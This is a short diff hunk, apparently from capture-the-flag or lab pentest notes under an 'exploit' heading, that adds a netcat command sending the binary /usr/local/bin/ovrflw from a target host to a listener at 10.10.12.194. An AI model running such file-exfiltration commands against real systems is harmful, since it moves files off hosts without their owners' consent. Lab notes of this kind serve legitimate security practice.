@@ -27,7 +27,7 @@ exploit
 * get files from the remote server
 
   * nc -l -p 999 &gt; ovrflw \(local\)
-  * 
+  * nc 10.10.12.194 -p 999 &lt; /usr/local/bin/ovrflw
 
 
 
